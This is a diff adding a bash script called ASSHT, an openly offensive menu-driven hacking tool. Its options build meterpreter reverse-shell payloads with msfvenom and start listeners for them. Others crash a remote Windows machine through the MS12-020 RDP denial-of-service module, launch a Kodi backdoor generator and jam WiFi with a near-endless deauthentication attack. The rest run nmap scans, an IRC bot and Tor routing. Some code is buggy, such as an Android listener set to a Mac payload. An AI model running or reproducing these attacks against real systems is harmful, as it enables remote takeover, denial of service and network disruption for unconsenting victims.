@@ -1,0 +1,333 @@
+#!/bin/bash
+#Automated Simple Small Hacking tool
+#ASSHT
+
+#OS DETECTION
+OS="`uname`"
+case $OS in
+  'Linux')
+    OS='Linux'
+    alias ls='ls --color=auto'
+    ;;
+  'FreeBSD')
+    OS='FreeBSD'
+    alias ls='ls -G'
+    ;;
+  'WindowsNT')
+    OS='Windows'
+    echo "not supported"
+    exit
+    ;;
+  'Darwin') 
+    OS='Mac'
+    echo "not supported"
+    exit
+    ;;
+  'AIX') ;;
+  *) ;;
+esac
+
+[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
+resize -s 30 60
+clear         
+SERVICE=service;
+
+if ps ax | grep -v grep | grep metasploit > /dev/null
+then
+    echo "$SERVICE service running"
+else
+    echo "$SERVICE is not running, Starting service." 
+    sudo service metasploit start
+fi 
+
+while :
+do
+clear
+echo -e "    \e[31m█████\e[97m╗ \e[31m███████\e[97m╗\e[31m███████\e[97m╗\e[31m██\e[97m╗  \e[31m██\e[97m╗\e[31m████████\e[97m╗"
+echo -e "   \e[31m██\e[97m╔══\e[31m██\e[97m╗\e[31m██\e[97m╔════╝\e[31m██\e[97m╔════╝\e[31m██\e[97m║  \e[31m██\e[97m║╚══\e[31m██\e[97m╔══╝"
+echo -e "   \e[31m███████\e[97m║\e[31m███████\e[97m╗\e[31m███████\e[97m╗\e[31m███████\e[97m║   \e[31m██\e[97m║   "
+echo -e "   \e[31m██\e[97m╔══\e[31m██\e[97m║╚════\e[31m██\e[97m║╚════\e[31m██\e[97m║\e[31m██\e[97m╔══\e[31m██\e[97m║   \e[31m██\e[97m║   "
+echo -e "   \e[31m██\e[97m║  \e[31m██\e[97m║\e[31m███████\e[97m║\e[31m███████\e[97m║\e[31m██\e[97m║  \e[31m██\e[97m║   \e[31m██\e[97m║   "
+echo -e "   \e[97m╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   " 
+echo -e "   \e[97mAuthor: David" 
+echo -e "   \e[97mGithub: @DavidOfficiel" 
+echo ""  
+sleep 2                                 
+echo -e "\e[31m ~ \e[97mAutomated Simple Small Hacking tool\e[31m ~" 
+echo ""
+sleep 1
+echo -e "\e[31m _[ \e[97mSELECT AN OPTION TO BEGIN \e[31m]_"
+echo ""
+echo -e "\e[31m[\e[97m01\e[31m] \e[97mPayload       \e[97m \e[31m[\e[97mCreate a payload with msfvenom\e[31m] "
+tput sgr0      
+sleep 0.2                      
+echo -e "\e[31m[\e[97m02\e[31m] \e[97mListen        \e[97m \e[31m[\e[97mStart multi handler\e[31m]   \E[1;33m"
+tput sgr0
+sleep 0.2 
+echo -e "\e[31m[\e[97m03\e[31m] \e[97mWindows Crash \e[97m \e[31m[\e[97mCrash A Local RDP machine\e[31m]   \E[1;33m"
+tput sgr0
+sleep 0.2 
+echo -e "\e[31m[\e[97m04\e[31m] \e[97mKodi Backdoor \e[97m \e[31m[\e[97mBasic meterpreter backdoor on Kodi.tv\e[31m]\E[1;33m"
+tput sgr0
+sleep 0.2 
+echo -e "\e[31m[\e[97m05\e[31m] \e[97mAutoNmap      \e[97m \e[31m[\e[97mAutomatic Scanning\e[31m]\E[1;33m"
+tput sgr0
+sleep 0.2 
+echo -e "\e[31m[\e[97m06\e[31m] \e[97mTorVPN        \e[97m \e[31m[\e[97mRoute traffic through tor\e[31m]\E[1;33m"
+tput sgr0
+sleep 0.2 
+echo -e "\e[31m[\e[97m07\e[31m] \e[97mWifiJammer    \e[97m \e[31m[\e[97mJam wifi networks with deuth attack\e[31m]\E[1;33m"
+tput sgr0
+sleep 0.2 
+echo -e "\e[31m[\e[97m08\e[31m] \e[97mIRC-BOT       \e[97m \e[31m[\e[97mProxy: 127.0.0.1:9050 \e[31m]\E[1;33m"
+tput sgr0
+sleep 0.2 
+echo -e "\e[31m[\e[97m09\e[31m] \e[97mAdfly         \e[97m \e[31m[\e[97mAdfly url decrypt\e[31m]\E[1;33m"
+tput sgr0
+sleep 0.2 
+echo -e "\e[31m[\e[97m10\e[31m] \e[97mAbout         \e[97m \e[31m[\e[97mwhoami\e[31m]\E[1;33m"
+sleep 0.2 
+echo ""
+echo -n "assht ~$ "
+read choice
+
+
+option1 () {
+ echo -e "\e[31m_[ \e[97mCREATE A PAYLOAD \e[31m]_"
+
+PS3='msfsimple ~$ '
+options=("Windows" "Linux" "Mac" "Android" "List_All" "Quit")
+select opt in "${options[@]}"
+do
+    case $opt in
+        "Windows")
+            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport; read -p 'Set FileName: ' name
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > output/$name.exe
+            ;;
+        "Linux")
+            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
+            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > output/$name.elf
+            ;;
+        "Mac")
+            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
+            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > output/$name.macho
+            ;;
+        "Android")
+            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
+            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > output/$name.apk
+            ;;  
+        "List_All")
+            xterm -e msvenom -l &
+            ;;   
+        "Quit")
+            echo "Good Bye" && break
+            ;;
+        *) echo invalid option;;
+    esac
+done
+}
+
+option2 () {
+echo -e "\e[31m_[ \e[97mCREATE A LISTNER \e[31m]_"
+PS3='msfsimple ~$ '
+options=("Windows" "Linux" "Mac" "Android" "List_All" "Quit")
+select opt in "${options[@]}"
+do
+    case $opt in
+        "Windows")
+            touch output/meterpreter.rc
+            echo use exploit/multi/handler > output/meterpreter.rc
+            echo set PAYLOAD windows/meterpreter/reverse_tcp >> output/meterpreter.rc
+            read -p 'Set LHOST IP: ' uservar
+            echo set LHOST $uservar >> output/meterpreter.rc
+            read -p 'Set LPORT: ' uservar
+            echo set LPORT $uservar >> output/meterpreter.rc
+            echo set ExitOnSession false >> output/meterpreter.rc
+            echo exploit -j -z >> output/meterpreter.rc
+            cat output/meterpreter.rc
+            xterm -e msfconsole -r output/meterpreter.rc &
+            ;;
+        "Linux")
+            touch output/meterpreter_linux.rc
+            echo use exploit/multi/handler > output/meterpreter_linux.rc
+            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> output/meterpreter_linux.rc
+            read -p 'Set LHOST IP: ' uservar
+            echo set LHOST $uservar >> output/meterpreter_linux.rc
+            read -p 'Set LPORT: ' uservar
+            echo set LPORT $uservar >> output/meterpreter_linux.rc
+            echo set ExitOnSession false >> output/meterpreter_linux.rc
+            echo exploit -j -z >> output/meterpreter_linux.rc
+            cat output/meterpreter_linux.rc
+            xterm -e msfconsole -r output/meterpreter_linux.rc &
+            exit
+            ;;
+        "Mac")
+            touch output/meterpreter_mac.rc
+            echo use exploit/multi/handler > output/meterpreter_mac.rc
+            echo set PAYLOAD osx/x86/shell_reverse_tcp >> output/meterpreter_mac.rc
+            read -p 'Set LHOST IP: ' uservar
+            echo set LHOST $uservar >> output/meterpreter_mac.rc
+            read -p 'Set LPORT: ' uservar
+            echo set LPORT $uservar >> output/meterpreter_mac.rc
+            echo set ExitOnSession false >> output/meterpreter_mac.rc
+            echo exploit -j -z >> output/meterpreter_mac.rc
+            cat output/meterpreter_mac.rc
+            xterm -e msfconsole -r output/meterpreter_mac.rc &
+            ;;
+        "Android")
+            touch output/meterpreter_droid.rc
+            echo use exploit/multi/handler > output/meterpreter_droid.rc
+            echo set PAYLOAD osx/x86/shell_reverse_tcp >> output/meterpreter_droid.rc
+            read -p 'Set LHOST IP: ' uservar
+            echo set LHOST $uservar >> output/meterpreter_droid.rc
+            read -p 'Set LPORT: ' uservar
+            echo set LPORT $uservar >> output/meterpreter_droid.rc
+            echo set ExitOnSession false >> output/meterpreter_droid.rc
+            echo exploit -j -z >> output/meterpreter_droid.rc
+            cat output/meterpreter_droid.rc
+            xterm -e msfconsole -r output/meterpreter_droid.rc &
+            ;;  
+        "List_All")
+            touch output/payloads.rc
+            echo show payloads > output/payloads.rc
+            cat output/payloads.rc
+            xterm -e msfconsole -r output/payloads.rc &
+            ;;   
+        "Quit")
+            echo "Good Bye" && break
+            ;;
+        *) echo invalid option;;
+    esac
+done
+}
+option3 () {
+ echo -e "\e[31m_[ \e[97mWINDOWS CRASH \e[31m]_"
+ PS3='msfsimple ~$ '
+ read -p 'Set RHOST IP: ' rhost
+            read -p 'Set RPORT: ' rport
+            xterm -T " WINDOWS CRASH " -geometry 110x23 -e "sudo msfconsole -x 'use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; set RHOST $rhost; exploit'"
+
+}
+
+option4 () {
+echo -e "\e[31m_[ \e[97mKodi BackDoor Generator\e[31m]_\e[97m"  
+python payloads/kodi/kodi-exploit.py
+sleep 1
+
+exit
+}
+
+option5 () {
+ echo -e "\e[31m_[ \e[97mAutoNmap \e[31m]_"
+ PS3='msfsimple ~$ '
+ read -p 'msfsimple ~$ ip:' ip
+ nmap nmap -v -sn $ip/24
+ sleep 2
+ nmap nmap -v -sn $ip
+ sleep 1
+ nmap nmap -sS -O $ip
+ python payloads/autonmap/autonmap.py $ip
+sleep 1
+
+exit
+}
+
+option6 () {
+echo -e "\e[31m_[ \e[97mTorVPN \e[31m]_\e[97m"  
+echo -e "\e[31m[ \e[97mstart \e[31m[\e[97m restart \e[31m[\e[97m stop\e[31m ] "
+read -p "assht@torvpn ~$ " vpnstatus
+torvpn --$vpnstatus
+exit
+}
+
+option7 () {
+read -p  "setup:interface : " int
+sleep 1
+echo ""
+read -p  "setup:bssid : " bssid
+sleep 1
+echo ""
+read -p  "setup:essid : " essid
+sleep 1
+echo ""
+read -p  "setup:channel : " channel
+
+echo -e "\e[0m\e[1m"
+cat << !
+
+ options
++------------------
+ BSSID     : $bssid
+ ESSID     : $essid
+ CHANNEL   : $channel
+ INTERFACE : $int
+
+!
+echo -e "\e[31m [ \e[97mpress ENTER to continue\e[31m] \e[97m" 
+read
+xterm -e airodump-ng -c $channel --bssid $bssid $int & xterm -e aireplay-ng --deauth 9999999999999 -o 1 -a $bssid -e $essid $int
+exit
+}
+
+option8 () {
+python payloads/irc/bot.py
+exit
+}
+
+option9 () {
+python payloads/adfly/adfly.py
+exit
+}
+
+option10 () {
+echo -e "\e[31m_[ \e[97mWHOAMI \e[31m]_\e[97m"  
+echo "
+ I am a guy named david dont ask why 
+ i was just given the name
+ i am from france and 
+ love to go across the world 
+ and learn new things
+ im a security enthusiast 
+ and love making cool new ideas 
+ or maybe learning of others
+ Hope you like it :D 
+ ~
+ merci beaucoup!
+"
+sleep 1
+
+exit
+}
+
+sh_exit () {
+sudo service metasploit stop
+clear
+echo "Stoping Services..."
+sleep 1
+
+exit
+}
+
+
+
+
+case $choice in
+1) option1 ;;
+2) option2 ;;
+3) option3 ;;
+4) option4 ;;
+5) option5 ;;
+6) option6 ;;
+7) option7 ;;
+8) option8 ;;
+9) option9 ;;
+10) option10 ;;
+11) option11 ;;
+12) option12 ;;
+13) option13 ;;
+14) option14 ;;
+exit) sh_exit ;;
+EXIT) sh_exit ;;
+*) echo "\"$choice\": Commande not found"; sleep 2 ;;
+esac
+done
